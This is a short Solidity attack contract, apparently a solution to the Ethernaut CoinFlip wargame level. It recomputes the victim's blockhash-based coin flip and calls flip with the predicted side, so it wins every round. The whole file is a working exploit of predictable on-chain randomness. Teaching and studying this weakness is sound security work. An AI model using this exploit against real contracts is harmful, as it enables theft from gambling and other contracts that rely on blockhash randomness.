// SPDX-License-Identifier: MIT

import "./og.sol";

contract CoinFlipAttack{
  CoinFlip immutable victim;

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  //Pass the addres of the contract instance of the ethernaut
  constructor(address _victim){
    victim = CoinFlip(_victim);
  }

  function flip() public{
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    victim.flip(side);
  }
}
